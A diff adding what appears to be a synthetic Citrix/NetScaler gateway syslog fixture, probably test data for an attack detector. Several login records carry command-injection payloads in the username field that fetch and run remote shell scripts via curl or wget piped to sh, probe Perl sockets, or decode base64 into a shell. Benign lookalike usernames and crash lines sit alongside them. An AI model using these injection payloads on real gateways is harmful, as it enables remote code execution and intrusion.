@@ -1,0 +1,25 @@
+Oct  5 09:00:01 <local0.notice> 192.0.2.5 10/05/2026:09:00:01 GMT gw-01 0-PPE-0 : default GUI CMD_EXECUTED 5001 0 :  User nsroot - Remote_ip 192.0.2.5 - Command "add system user ops-ro" - Status "Success"
+Oct  5 09:00:02 <local0.notice> 192.0.2.5 10/05/2026:09:00:02 GMT gw-01 0-PPE-0 : default CLI CMD_EXECUTED 5002 0 :  User nsroot - Remote_ip 192.0.2.5 - Command "shell" - Status "Success"
+Oct  5 09:00:03 <local0.notice> gw-01 0-PPE-0 : default SHELL shell_command=grep -c . /var/log/ns.log user=nsroot
+Oct  5 09:00:04 <local0.notice> gw-01 0-PPE-0 : default SHELL sh_command=sh /var/nssnapshot/ns_quickcheck.sh --no-out user=nsroot
+Oct  5 09:00:05 <local0.notice> gw-01 0-PPE-0 : default SHELL shell_command=/netscaler/nsprofmon_mgmt.pl -ys user=nsroot
+Oct  5 09:01:10 <local0.info> 198.51.100.40 10/05/2026:09:01:10 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5101 0 :  Request from client 198.51.100.40 for user "user03" vserver gw-vs
+Oct  5 09:01:11 <local0.info> 198.51.100.40 10/05/2026:09:01:11 GMT gw-01 0-PPE-0 : default AAA Message 5102 0 :  "authenticate user: succeeded for user user03"
+Oct  5 09:02:00 <local0.info> 198.51.100.41 10/05/2026:09:02:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5103 0 :  Request from client 198.51.100.41 for user "o'neill.sean" vserver gw-vs
+Oct  5 09:03:00 <local0.info> 198.51.100.42 10/05/2026:09:03:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5104 0 :  Request from client 198.51.100.42 for user "user04" User-Agent "CitrixReceiver/26.9.0 Windows/10.0 X1Class"
+Oct  5 09:04:00 <local0.info> 198.51.100.43 10/05/2026:09:04:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5105 0 :  Request from client 198.51.100.43 for user "DOMAIN\user05" vserver gw-vs
+Oct  5 09:05:00 <local0.info> 198.51.100.44 10/05/2026:09:05:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5106 0 :  Request from client 198.51.100.44 for user "user06+ext@example.net" vserver gw-vs
+Oct  5 09:06:00 <local0.info> 198.51.100.45 10/05/2026:09:06:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5107 0 :  Request from client 198.51.100.45 for user "müller.jörg" vserver gw-vs
+Oct  5 09:07:00 <local0.info> 198.51.100.46 10/05/2026:09:07:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5108 0 :  Request from client 198.51.100.46 for user "sh.arma" vserver gw-vs
+Oct  5 09:08:00 <local0.info> 198.51.100.47 10/05/2026:09:08:00 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 5109 0 :  Request from client 198.51.100.47 for user "grep.thomas" vserver gw-vs
+Oct  5 03:12:44 <local0.info> 198.51.100.7 10/05/2026:03:12:44 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1201 0 :  Request from client 198.51.100.7 for user "pitboss unexpectedly died; curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=TESTKEY|sh" vserver gw-vs
+Oct  5 03:12:44 <local0.info> 198.51.100.7 10/05/2026:03:12:44 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1202 0 :  Request from client 198.51.100.7 for user "missed too many heartbeats; wget -q http://143.198.7.94/x.sh -O /var/tmp/x.sh; sh /var/tmp/x.sh" vserver gw-vs
+Oct  5 03:12:45 <local0.info> 198.51.100.7 10/05/2026:03:12:45 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1203 0 :  Request from client 198.51.100.7 for user "NSPPE-0 ; perl -e 'use Socket;' ; echo pylrk.cc" vserver gw-vs
+Oct  5 03:12:46 <local0.info> 198.51.100.7 10/05/2026:03:12:46 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1204 0 :  Request from client 198.51.100.7 for user "user01%3Bcurl%20http%3A%2F%2Fgs.thc.org%2Fx%7Csh" vserver gw-vs
+Oct  5 03:12:47 <local0.notice> 198.51.100.7 10/05/2026:03:12:47 GMT gw-01 0-PPE-0 : default AAA Message 1205 0 :  "authenticate user: failed for user pitboss unexpectedly died; curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=TESTKEY|sh"
+Oct  5 03:13:01 <local0.info> 198.51.100.7 10/05/2026:03:13:01 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1206 0 :  Request from client 198.51.100.7 for user "pitboss PPE missed too many heartbeats NSPPE-0 ; grep${IFS}INDEX:${IFS}/var/log/httpaccess.log|sed${IFS}s/.*INDEX://|b64decode${IFS}-r|sh" vserver gw-vs
+Oct  5 03:13:02 <local0.info> 198.51.100.7 10/05/2026:03:13:02 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1207 0 :  Request from client 198.51.100.7 for user "user05" User-Agent "INDEX:ZWNobyBoZWxsbyB8IGI2NGRlY29kZSAtcg== ;b64decode -r|sh"
+Oct  6 11:20:03 <local0.info> 198.51.100.21 10/06/2026:11:20:03 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 3301 0 :  Request from client 198.51.100.21 for user "user02" vserver gw-vs samlauth
+Oct  6 11:20:04 <kern.notice> gw-01 kernel: pid 2231 (nsaaad), uid 0: exited on signal 11 (core dumped)
+Oct  6 11:20:05 <daemon.err> gw-01 pitboss[1120]: proc nsaaad[2231] SIGNALED, restarting
+Oct  6 11:20:40 <daemon.err> gw-01 pitboss[1120]: nsaaad unexpectedly died
